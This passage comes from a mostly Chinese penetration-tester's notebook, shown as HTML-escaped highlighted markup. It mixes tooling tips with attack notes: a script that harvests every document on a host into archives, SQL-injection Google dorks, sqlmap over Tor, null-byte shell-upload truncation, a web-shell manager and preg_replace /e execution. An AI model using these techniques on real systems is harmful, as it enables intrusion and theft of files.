    7z a -t7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
    ------------------end--------------------------------&lt;span class=&quot;sb&quot;&gt;

    linux打包命令:1.sh(attention:without &quot;&amp;amp;&amp;amp; echo ok&quot;,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
    -----------------content of 1.sh--------------------
    mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
    --------------------end-----------------------------
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;41.&lt;/span&gt;kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
&lt;span class=&quot;p&quot;&gt;42.&lt;/span&gt;http://www.orico.com.cn/   driver    
&lt;span class=&quot;p&quot;&gt;43.&lt;/span&gt;python中单引号,双引号,三引号http://blog.csdn.net/caianye/article/details/6638183       
&lt;span class=&quot;p&quot;&gt;44.&lt;/span&gt;mygoogle dork:
    site:ooxx.ooxx.ooxx syntax
    site:... error
    http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
   inurl:&quot;php&quot;|&quot;php page=&quot;|&quot;php id=&quot;|&quot;php tid=&quot;|&quot;php pid=&quot;|&quot;php cid=&quot;|&quot;php path=&quot;|&quot;php cmd=&quot;|&quot;php file=&quot;|&quot;php cartId=&quot;|&quot;php bookid=&quot;|&quot;php num=&quot;|&quot;php idProduct=&quot;|&quot;php ProdId=&quot;|&quot;php idCategory=&quot;|&quot;php intProdID=&quot;|&quot;cfm storeid=&quot;|&quot;php catid=&quot;|&quot;php cart_id=&quot;|&quot;php order_id=&quot;|&quot;php catalogid=&quot;|&quot;php item=&quot;|&quot;php title=&quot;|&quot;php CategoryID=&quot;|&quot;php action=&quot;|&quot;php newsID=&quot;|&quot;php newsid=&quot;|&quot;php product_id=&quot;|&quot;php cat=&quot;|&quot;php parent_id=&quot;|&quot;php view=&quot;|&quot;php itemid=&quot; site:www.facebook.com
&lt;span class=&quot;p&quot;&gt;45.&lt;/span&gt;os.system(&#39;&#39;&#39;python %s &amp;gt;&amp;gt; &quot;out_log.txt&quot;&#39;&#39;&#39; % exp_path) &quot;&amp;gt;&amp;gt;&quot; instead of &quot;open(file,&quot;a+&quot;) fp.write(str)&quot; in py2 or py3
&lt;span class=&quot;p&quot;&gt;46.&lt;/span&gt;tips:  
   msf必不可少burpsuite/fiddler必不可少python,ruby,shell,perl必不可少,不会编程还是别玩了.
   c/c++/java能看懂写小东西,这几个得熟练nmap,sqlmap,niktoida常备dropbox,evernote常备还有啥呢?
   成形的工具只能用于通用检测,针对具体对象,还需要写些自己的工具,另外准备些有针对性的基础库,字典啥的,经常干这个都知道先想到这些,稍后再补充,再紧张干活中…….
&lt;span class=&quot;p&quot;&gt;47.&lt;/span&gt;google-chrome-stable on kali linux2.0
   adding --user-data-dir
   and open terminal : /usr/bin/google-chrome-stable %U --no-sandbox  or cd /usr/share/applications edit Google Chrome by right mouse,add     %U --no-sandbox
&lt;span class=&quot;p&quot;&gt;48.&lt;/span&gt;sqlmap with tor:http://navisec.it/%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8sqlmap/
   sqlmap --tor --tor-type=socks5 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;--tor-port=9050&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; --check-tor
   sqlmap --proxy=socks5://127.0.0.1:9050
   sqlmap --proxy=socks5://127.0.0.1:9050 --proxy-cred=admin:pass
&lt;span class=&quot;p&quot;&gt;49.&lt;/span&gt;tor的笔记:
   1&amp;gt;apt-get install tor安装的tor默认端口是9050,开机自启动tor:vim /etc/rc.local,在exit 0前加上service tor start,和proxychains搭配使用时设置proxychains.conf里面的端口为9050
   2&amp;gt;Tor-Browser洋葱浏览器自带tor,每次启动tor-browser时,它会启动它自带的tor,该tor默认端口是9150(老版本的是9050)
   3&amp;gt;1中的tor和2中的tor功能完全一样,proxychains firefox等程序时对应的proxychains.conf里面的端口为9050,启动tor-browser浏览器后可用也可将proxychains.conf中端口改为9150,但tor-browser关闭后proxychains这样的代理设置会失效.
&lt;span class=&quot;p&quot;&gt;50.&lt;/span&gt;Python Unicode与中文处理:http://my.oschina.net/u/201886/blog/64692
&lt;span class=&quot;p&quot;&gt;51.&lt;/span&gt;shadow copy神器,可以复制使用中的文件,可拷贝数据库
&lt;span class=&quot;p&quot;&gt;52.&lt;/span&gt;php中的header()函数 http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html
&lt;span class=&quot;p&quot;&gt;53.&lt;/span&gt;php中{}的功能 http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq
&lt;span class=&quot;p&quot;&gt;54.&lt;/span&gt;php上传中%00截断的理解:
   python脚本中:
   def hex_to_asc(ch):
       return &#39;{:c}&#39;.format(int(float.fromhex(ch)))

   for i in range(100):
       s = &#39;%02d&#39; % i
       print &quot;s:%s,hex_to_asc(s):%s&quot; % (s,hex_to_asc(s))
   可以得到如下结果:
   s:00,hex_to_asc(s):NULL
   s:01,hex_to_asc(s):
   s:02,hex_to_asc(s):
   ...
   s:29,hex_to_asc(s):)
   s:30,hex_to_asc(s):0
   s:31,hex_to_asc(s):1
   s:32,hex_to_asc(s):2
   s:33,hex_to_asc(s):3
   s:34,hex_to_asc(s):4
   s:35,hex_to_asc(s):5
   s:36,hex_to_asc(s):6
   s:37,hex_to_asc(s):7
   s:38,hex_to_asc(s):8
   s:39,hex_to_asc(s):9
   s:40,hex_to_asc(s):@
   s:41,hex_to_asc(s):A
   s:42,hex_to_asc(s):B
   s:43,hex_to_asc(s):C
   s:44,hex_to_asc(s):D
   s:45,hex_to_asc(s):E
   s:46,hex_to_asc(s):F
   s:47,hex_to_asc(s):G
   s:48,hex_to_asc(s):H
   s:49,hex_to_asc(s):I
   s:50,hex_to_asc(s):P
   s:51,hex_to_asc(s):Q
   s:52,hex_to_asc(s):R
   s:53,hex_to_asc(s):S
   s:54,hex_to_asc(s):T
   s:55,hex_to_asc(s):U
   s:56,hex_to_asc(s):V
   s:57,hex_to_asc(s):W
   s:58,hex_to_asc(s):X
   s:59,hex_to_asc(s):Y
   s:60,hex_to_asc(s):&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;
   s:61,hex_to_asc(s):a
   s:62,hex_to_asc(s):b
   ascii码对照表中情况:
   标准I表:
   bin          dec          hex          缩写/字符                 解释
   0000 0000    0            00           NUL(null)                空字符
   0000 0001    1            01           SOH(start of headline)   标题开始
   ...
   0010 0000    32           20           (space)                  空格
   00110000     48           30           0
   01000001     65           41           A
   01100001     97           61           a
   在计算机中,所有的数据在存储和运算时都要使用二进制数表示(因为计算机用高电平和低电平分别表示1和0),例如,像a、b、c、d这样的52个字母(包括大写)、以及0、1等数字还有一些常用的符号(例如&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;、#、@等)在计算机中存储时也要使用二进制数来表示,而具体用哪些二进制数字表示哪个符号,当然每个人都可以约定自己的一套(这就叫编码),而大家如果要想互相通信而不造成混乱,那么大家就必须使用相同的编码规则,于是美国有关的标准化组织就出台了ASCII编码,统一规定了上述常用符号用哪些二进制数来表示.
   个人理解成ascii码只是一个对照关系,如果硬说ascii是多少,则把ascii码值当作&quot;缩写/字符&quot;一栏对应的值,
   即二进制(01000001)对应二进制(65)对应十六进制(41),而它们对应的ascii码为键盘上的可控字符&quot;A&quot;,
   所以%00截断时的下面两种情况:
&lt;span class=&quot;p&quot;&gt;   1.&lt;/span&gt;在url中加入%00,如http://xxoo/shell.php%00.jpg
&lt;span class=&quot;p&quot;&gt;   2.&lt;/span&gt;在burpsuite中用burp自带的十六进制编辑工具将&quot;shell.php .jpg&quot;(中间有空格)中的空格由20改成00
&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
   在1中,url中的%00(形如%xx),web server会把它当作十六进制处理,然后将该十六进制数据hex(00)&quot;翻译&quot;成统一的ascii码值&quot;NUL(null)&quot;,实现了截断;
&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
   在2中,burpsuite用burp自带的十六进制编辑工具将&quot;shell.php .jpg&quot;(中间有空格)中的空格由20改成00,如果burp中有二进制编辑工具,
   也可以将&quot;shell.php .jpg&quot;(中间有空格)中的空格由000010 0000(键盘上可控字符space对应的二进制)改成0000 0000(null对应的二进制),
   上传到服务器后,服务器作为一台计算机也会将该处的原来的空格由于被改成截断符后&quot;翻译&quot;成null,实现了截断功能;
&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
   所以在用python(或其它语言)中,要想&quot;写出&quot;截断符(null),
   也就是要写出ascii码值的NUL(null),也就是要由hex(十六进制)下的
   00变成ascii码值,这是语言和解释器以及计算机之间的关系,正如上面的python脚本,
   而php中:
   --------w3c:
   定义和用法
   chr() 函数从指定的 ASCII 值返回字符.
   ASCII 值可被指定为十进制值、八进制值或十六进制值.八进制值被定义为带前置 0,而十六进制值被定义为带前置 0x. 
   --------w3c  (w3c这里的说法把ascii值看作有不同的进制表示形态的各进制值)
   其中chr(61)为=,chr(061)为1,chr(0x61)为a,chr(128)=chr(0x80),chr(255)=chr(0xff)
   script 1:
   &amp;lt;?php
   for($k=0;$k&amp;lt;=255;$k++)
   {
   $a=&#39;shell.php&#39;.chr($k).&quot;1.jpg&quot;;
   echo &#39;k:&#39;.$k.&#39;   &#39;.&#39;$a:&#39;.$a.&#39;   &#39;.&#39;iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a):&#39;.iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a).&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&quot;;
   }
   ?&amp;gt;

   其中iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a)或是iconv(&quot;UTF-8&quot;,&quot;gb2313&quot;,$a)都会在chr(128)到chr(255)之间截断,使结果为1,而不是1(some char)2,
   其中128和255为二进制数据表示,此处NUL(nul)(chr(0x00))并不能截断iconv函数,而是chr(128)-chr(255),也即chr(0x80)-chr(0xff)截断iconv函数.
   或者用如下代码中hex2asc函数:
   script 2:
   &amp;lt;?php
    
   function asc2hex($str) {  
   return &#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;.substr(chunk_split(bin2hex($str), 2, &#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;),0,-2);  
   } &lt;span class=&quot;sb&quot;&gt;

    
&lt;/span&gt;   function hex2asc($str) {  
   $str = join(&#39;&#39;,explode(&#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;,$str));  
   $len = strlen($str);  
   for ($i=0;$i&amp;lt;$len;$i+=2) $data.=chr(hexdec(substr($str,$i,2)));  
   return $data;  
   }  &lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;   for($k=0;$k&amp;lt;256;$k++)
   {
   $a=sprintf(&quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;%02x&quot;,$k);
   echo &#39;$k:&#39;.$k.&#39; &#39;;
   echo &#39;$a:&#39;.$a.&#39; &#39;;
   echo &#39;hex2asc($a):&#39;.hex2asc($a);
   $file_name=&quot;shell.php&quot;.hex2asc($a).&quot;1.jpg&quot;;
   echo &#39;$file_name:&#39;.$file_name.&#39;  &#39;;
   $file_name=iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;,$file_name);
   echo &#39;iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;,$file_name):&#39;.$file_name.&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&quot;;
   }
   /&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
   echo hex2asc(&#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&#39;);
   &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/
   ?&amp;gt;
   相同情况下的python脚本为:
   def hex_to_asc(ch):
    return &#39;{:c}&#39;.format(int(float.fromhex(ch)))

   for i in range(256):
    s = &#39;%02x&#39; % i
    print &quot;s:&quot;,s,&quot;    &quot;,
    print &quot;hex_to_asc(s):&quot;,hex_to_asc(s)
    # print &quot;s:%s,hex_to_asc(s):%s&quot; % (s,hex_to_asc(s))
&lt;span class=&quot;p&quot;&gt;55.&lt;/span&gt;htmlspecialchars的作用是把:
   &amp;amp; (和号) 成为 &amp;amp;
   &quot; (双引号) 成为 &quot;
   &#39; (单引号) 成为 &#39;
   &amp;lt; (小于) 成为 &amp;lt;
&lt;span class=&quot;gt&quot;&gt;   &amp;gt; (大于) 成为 &amp;gt;   &lt;/span&gt;
   输出的时候不需要特殊处理 浏览器 会把这些标签还原的
&lt;span class=&quot;p&quot;&gt;56.&lt;/span&gt;linux命令行下结束firefox进程:
   ps -aux | grep firefox | awk &#39;{if($11==&quot;firefox&quot;) print $2}&#39;| xargs kill -9
   pkill firefox
&lt;span class=&quot;p&quot;&gt;57.&lt;/span&gt;菜刀替代工具:Altman
   http://www.i0day.com/1725.html
   https://github.com/keepwn/Altman
&lt;span class=&quot;p&quot;&gt;58.&lt;/span&gt;Pidgin my irc client on linux http://www.linux.com/news/software/applications/295201:five-best-irc-clients-for-linux
&lt;span class=&quot;p&quot;&gt;59.&lt;/span&gt;dig mx domain(without www)
&lt;span class=&quot;p&quot;&gt;60.&lt;/span&gt;pwntool:https://www.91ri.org/14382.html
&lt;span class=&quot;p&quot;&gt;61.&lt;/span&gt;vim以十六进制编辑文件:%!xxd
       :%!xxd    ---&amp;gt;   :%!xxd -r    ---&amp;gt;    :wq
       如果失败则用hexedit编辑
           ctrl+X:save and exit
   vim对比两个文件:vim -d 1.txt 2.txt
   vim自动保存有用版本答案(相当于esc/jk实现保存功能):au InsertLeave &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; write
&lt;span class=&quot;p&quot;&gt;62.&lt;/span&gt;sublime插件:
    python pep8 autoformat(python代码自动对齐)ctrl+shift+r
    JsFormat(javascript代码自动对齐)ctrl+alt+f
&lt;span class=&quot;p&quot;&gt;63.&lt;/span&gt;linux install node.js&amp;amp;npm   http://www.iteblog.com/archives/1313
&lt;span class=&quot;p&quot;&gt;64.&lt;/span&gt;html内嵌js:
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Script&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;JavaScript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
   var a = prompt(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;8f93&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5165&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;4f60&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;7684&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6c&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;67&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5427&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff0c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5c11&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;5e74&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff01&quot;, &quot;&quot;);
   var b = &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;63&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;33&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&quot;;
   var c = /.+_.+_.+/gi;
   var d = 0x0;
   var e = a.substr(0x8, 0x5);
   if ($.md5(e) == b.replace(/7/ig, ++d).replace(/8/ig, d &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; 0x2)) {
    var f = a.substr(0x0 / d, 0x7);
    if (f.substr(0x5, 0x2) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&quot; &amp;amp;&amp;amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;38&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;35&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;30&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;37&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;39&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&quot;) {
      r = a.substr(0xd);
      if (r.charCodeAt(d) - 0x19 == r.charCodeAt(++d) - 0x19 &amp;amp;&amp;amp; r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d)) {
        var g = String.fromCharCode(0x4f);
        g = g.toLowerCase() + g.toLowerCase();
        if (r.substr((++d) &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; 0x3, 0x6) == g.concat(&quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;79&quot;) &amp;amp;&amp;amp; c.test(a)) {
          d = String(0x1) + String(a.length)
        }
      }
    }
   };
   if (a.substr(0x4, 0x1) != String.fromCharCode(d) || a.substr(0x4, 0x1) == &quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;7a&quot;) {
    alert(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;989d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff0c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;518d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;53bb&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;60f3&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;60f3&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;3002&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;3002&quot;)
   } else {
    alert(&quot;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;606d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;559c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;606d&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;559c&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ff01&quot;)
   }
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;65.&lt;/span&gt;安装requirements.txt中要求的环境:pip install -r requirements.txt
&lt;span class=&quot;p&quot;&gt;66.&lt;/span&gt;urllib&amp;amp;urllib2:
  (爬虫实现http://blog.csdn.net/pleasecallmewhy/article/details/8925978
    http://blog.csdn.net/pleasecallmewhy/article/details/8934726)
    beautifulsoup中文http://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html
   0&amp;gt;easyest way
   import urllib2
   response = urllib2.urlopen(&#39;http://python.org/&#39;)
   html = response.read()

   1&amp;gt;without post
   import urllib2
   req = urllib2.Request(&#39;http://www.voidspace.org.uk&#39;)
   response = urllib2.urlopen(req)
   the_page = response.read()

   2&amp;gt;post:(要加入 header,data,需要使用 Request 对象)
   import urllib
   import urllib2   
   url = &#39;http://www.someserver.com/cgi-bin/register.cgi&#39;
   values = {&#39;name&#39; : &#39;Michael Foord&#39;,
             &#39;location&#39; : &#39;Northampton&#39;,
             &#39;language&#39; : &#39;Python&#39; }
   data = urllib.urlencode(values)
   req = urllib2.Request(url, data)
   response = urllib2.urlopen(req)
   the_page = response.read()
&lt;span class=&quot;p&quot;&gt;67.&lt;/span&gt;python使用urllib2容易犯的错误:
　　系统安装了google的chrome浏览器,需要burp截chrome的包时会在里面设置代理,而chrome设置的代理即是系统的代理,而firefox设置的代理只是firefox浏览器的代理,并不影响系统的网络访问是否要经过firefox设置的代理,
　　如果设置了chrome的代理如127.0.0.1:8080,事后忘记关闭,则会影响到系统中所有需要联网的程序.
  　urllib2 默认会使用环境变量 http_proxy来设置 HTTP Proxy,如果想在程序中明确控制 Proxy 而不受环境变量的影响,可以使用自己设置的代理,可以设置代理为空:

  　null_proxy_handler=urllib2.ProxyHandler({})
  　opener=urllib2.build_opener(null_proxy_handler)
  　urllib2.install_opener(opener)

  　这样就不会出现urllib2　error 101　refused的错误了,也可以将系统的127.0.0.1:8080的代理关掉.(linux中set命令可以看到http_proxy的值,http_proxy并不是vpn的ip)
  　在sublime text中有个sublimeREPL插件,f5快捷键可编译运行python脚本,然而就算系统设置了代理127.0.0.1:8080等,f5依然可以将使用了urllib2且没有加上面３行代码的python脚本
  　成功执行,也许是sublimeREPL中默认的运行代码设置了自己的代理为空,且不影响系统代理http_proxy的值.
&lt;span class=&quot;p&quot;&gt;68.&lt;/span&gt;python,beautifulsoup中正则匹配中文的错误解决办法:http://www.lylinux.org/python%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87.html
&lt;span class=&quot;p&quot;&gt;69.&lt;/span&gt;python中获得执行系统命令的输出:http://blog.csdn.net/g457499940/article/details/17068277
&lt;span class=&quot;p&quot;&gt;70.&lt;/span&gt;python代码中不能有~符号当作/root目录的习惯,open(&#39;~/something&#39;,&#39;r+&#39;)会出错,os.system(&#39;~/something&#39;)不会,为保证不出错,在代码中不用~符号,另外os.system(),open()等函数中不要有%s这种格式化字符串变量
　　如果要用到在这些函数中传入一个变量作参数,先在os.system(),open()等函数前面格式化成普通不带%s的变量再传入这些函数,eg.a=&#39;python /root/%s&#39; % input(),os.system(a)
&lt;span class=&quot;p&quot;&gt;71.&lt;/span&gt;ida pro中graph功能失败,could not find grapher &#39;qwingraph.exe&#39;.please check GRAPH_VISUALIZER in ida.cfg　　　　　　解决方法http://blog.csdn.net/qysh123/article/details/17590731
&lt;span class=&quot;p&quot;&gt;72.&lt;/span&gt;sqlmap跑出有如
   Payload: 8.8.8.8&#39; AND 3588=3588-- RMEo
   的盲注,如果使用了--batch参数或者使用sqlmap推荐的(found sql injection in MySQL database,dismiss other type of database?Y/n),虽然这样的盲注一般是MySQL的注入点,但是其他数据库也有可能是这样的,
   比如SQLite,这个时候如果同意忽略其他数据库类型的检测,会发现sqlmap按照MySQL的注入语法跑不出什么结果,database:none.同理,在一般sqlmap使用过程中,为了全面的检测,最好不要一直使用sqlmap推荐的默认选项.在此例中,使用--dbms=SQLite
   参数,成功跑出目标SQLite数据库的内容.另外,实验中发现sqlmap会出现一会能跑出,一会跑不出的现象,可见,工具不是完全可靠的,要是一下没有跑出,多跑几次就出来了.
&lt;span class=&quot;p&quot;&gt;73.&lt;/span&gt;preg_replace包含/e修饰符利用:http://www.jb51.net/article/38714.htm　其中echo &quot;${@phpinfo()}&quot;;就可以了,不必　echo &quot;{${phpinfo()}}&quot;;
&lt;span class=&quot;p&quot;&gt;74.&lt;/span&gt;vim配置:
          https://github.com/xinghuacai/spf13-vim
          http://blog.csdn.net/namecyf/article/details/7787479
          https://github.com/Valloric/YouCompleteMe
          https://github.com/VundleVim/Vundle.vim#about
   python操作vim
          http://top.jobbole.com/15078/
   vim中F5编译运行py文件:1&amp;gt;http://zhidao.baidu.com/link?url=VwJYAbWPaVimFP0uC26hdOV8EFTTcWFIi2xvexA9z-K7dcFIpD-1TnN9893937bxdEGcrlx2qR-cEsK-UVzoma
                           把function添加在_vimrc的前边,不要放在最后:
                           function CheckPythonSyntax()
                               let mp = &amp;amp;makeprg
                               let ef = &amp;amp;errorformat
                               let exeFile = expand(&quot;%:t&quot;)
